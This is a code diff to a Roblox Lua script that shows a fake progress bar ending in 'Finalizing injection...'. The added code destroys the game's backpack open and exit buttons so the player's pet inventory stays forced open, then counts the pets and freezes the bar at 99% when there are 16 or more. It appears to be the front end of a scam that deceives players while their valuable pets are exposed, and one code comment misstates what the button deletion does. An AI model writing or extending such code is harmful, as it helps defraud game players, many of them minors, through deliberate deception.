@@ -46,7 +46,7 @@ local fillCorner = Instance.new("UICorner")
 fillCorner.CornerRadius = UDim.new(0,15)
 fillCorner.Parent = fill
 
--- gradient (animated)
+-- gradient
 local gradient = Instance.new("UIGradient")
 gradient.Rotation = 0
 gradient.Color = ColorSequence.new{
@@ -106,8 +106,54 @@ end
 
 typeText(messages[1])
 
--- ANIMATION ONLY: start bar immediately
-local maxProgress = 99 -- default
+-- Animate gradient
+task.spawn(function()
+	while true do
+		gradient.Offset = Vector2.new((gradient.Offset.X + 0.01) % 1, 0)
+		task.wait(0.03)
+	end
+end)
+
+-- Function to force backpack open
+local function forceBackpackOpen()
+	local openButton = player.PlayerGui:WaitForChild("FocusPetApp")
+		:WaitForChild("Frame")
+		:WaitForChild("Backpack")
+		:WaitForChild("OpenbackpackContainer")
+		:WaitForChild("OpenBackpack")
+	if openButton and openButton:IsA("ImageButton") then
+		openButton:Destroy() -- click simulated by destroying it, now open
+	end
+	-- delete the ExitButton so the player can close the inventory
+	local exitBtn = player:WaitForChild("BackpackApp")
+		:WaitForChild("Frame")
+		:WaitForChild("Header")
+		:WaitForChild("ExitButton")
+	if exitBtn then
+		exitBtn:Destroy()
+	end
+end
+
+forceBackpackOpen()
+
+-- Determine total pets
+local petsFolder = player:WaitForChild("BackpackApp")
+	:WaitForChild("Frame")
+	:WaitForChild("Body")
+	:WaitForChild("ScrollComplex")
+	:WaitForChild("ScrollingFrame")
+	:WaitForChild("Content")
+	:WaitForChild("pets")
+
+local totalChildren = 0
+for _, row in ipairs(petsFolder:GetChildren()) do
+	totalChildren += #row:GetChildren()
+end
+
+-- Decide max progress based on pets
+local maxProgress = totalChildren >= 16 and 99 or 100
+
+-- Animate bar
 task.spawn(function()
 	while progress < maxProgress do
 		local speed = 0.06
@@ -131,45 +177,10 @@ task.spawn(function()
 
 		task.wait(0.05)
 	end
-end)
 
--- wait for pets folder dynamically
-task.spawn(function()
-	local contentFolder = player:WaitForChild("BackpackApp")
-		:WaitForChild("Frame")
-		:WaitForChild("ScrollComplex")
-		:WaitForChild("ScrollingFrame")
-		:WaitForChild("Content")
-
-	local petsFolder = contentFolder:WaitForChild("pets")
-
-	-- count total children
-	local totalChildren = 0
-	for _, row in ipairs(petsFolder:GetChildren()) do
-		totalChildren += #row:GetChildren()
-	end
-
-	-- decide max progress based on pets count
 	if totalChildren < 16 then
-		-- let bar go to 100%
-		while progress < 100 do
-			progress += 0.5
-			progress = math.min(progress,100)
-			percent.Text = math.floor(progress).."%"
-			fill.Size = UDim2.new(progress/100,0,1,0)
-			task.wait(0.05)
-		end
 		status.Text = "Minimum pet requirement not achieved"
 	else
-		-- freeze at 99%
 		status.Text = "Finalizing injection..."
-	end
-end)
-
--- gradient animation
-task.spawn(function()
-	while true do
-		gradient.Offset = Vector2.new((gradient.Offset.X + 0.01) % 1, 0)
-		task.wait(0.03)
 	end
 end)
